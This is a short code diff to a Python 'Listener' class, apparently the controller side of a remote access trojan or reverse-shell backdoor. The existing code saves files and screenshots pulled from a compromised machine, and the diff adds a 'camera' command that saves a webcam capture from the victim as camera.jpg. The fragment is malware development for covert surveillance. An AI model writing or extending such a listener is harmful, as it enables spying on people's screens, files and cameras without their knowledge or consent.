@@ -59,6 +59,8 @@ class Listener:
 					self.write_file(command.split()[1], result)
 				elif command.split()[0] == "screenshot":
 					self.write_file("screen.png", result)
+				elif command.split()[0] == "camera":
+					self.write_file("camera.jpg", result)
 				else:
 					if result != None:
 						print(result)
